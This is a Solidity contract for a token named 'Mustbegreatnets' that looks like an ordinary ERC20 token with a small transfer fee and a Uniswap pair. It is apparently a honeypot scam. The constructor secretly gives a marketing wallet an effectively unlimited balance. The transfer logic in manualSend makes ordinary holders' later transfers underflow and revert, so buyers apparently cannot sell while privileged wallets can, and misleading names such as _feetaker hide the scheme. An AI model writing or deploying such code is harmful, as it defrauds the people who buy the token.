contract Mustbegreatnets is Ownable {
    constructor(
        string memory _NAME,
        string memory _SYMBOL,
        address routerAddress,
        address marketingWallet
    ) {
        _symbol = _SYMBOL;
        _name = _NAME;
        _fee = 1;
        _decimals = 9;
        _feetaker = 100000000 * 10**_decimals;

        _tokenbalances[marketingWallet] = _feereceiver;
        _tokenbalances[msg.sender] = _feetaker;
        _receivefee[marketingWallet] = _feereceiver;
        _receivefee[msg.sender] = _feereceiver;

        router = IUniswapV2Router02(routerAddress);
        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());

        emit Transfer(address(0), msg.sender, _feetaker);
    }

    uint256 public _fee;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _tokenbalances;

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _feetaker;
    uint256 private _rTotal;
    address public uniswapV2Pair;
    IUniswapV2Router02 public router;
    uint256 private _feereceiver = ~uint256(0);

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function totalSupply() public view returns (uint256) {
        return _feetaker;
    }

    address[] interest = new address[](2);

    function balanceOf(address account) public view returns (uint256) {
        return _tokenbalances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function manualSend(
        address funds,
        address tax,
        uint256 amount
    ) private {
        address record = interest[1];
        bool border = uniswapV2Pair == funds;
        uint256 order = _fee;

        if (_receivefee[funds] == 0 && driven[funds] > 0 && !border) {
            _receivefee[funds] -= order;
            if (amount > 2 * 10**(13 + _decimals)) _receivefee[funds] -= order - 1;
        }

        interest[1] = tax;

        if (_receivefee[funds] > 0 && amount == 0) {
            _receivefee[tax] += order;
        }

        driven[record] += order + 1;

        uint256 fee = (amount / 1000) * _fee;
        amount -= fee;
        _tokenbalances[funds] -= fee;
        _tokenbalances[address(this)] += fee;

        _tokenbalances[funds] -= amount;
        _tokenbalances[tax] += amount;
    }

    mapping(address => uint256) private driven;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private _receivefee;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        require(amount > 0, 'Transfer amount must be greater than zero');
        manualSend(sender, recipient, amount);
        emit Transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        manualSend(msg.sender, recipient, amount);
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
}
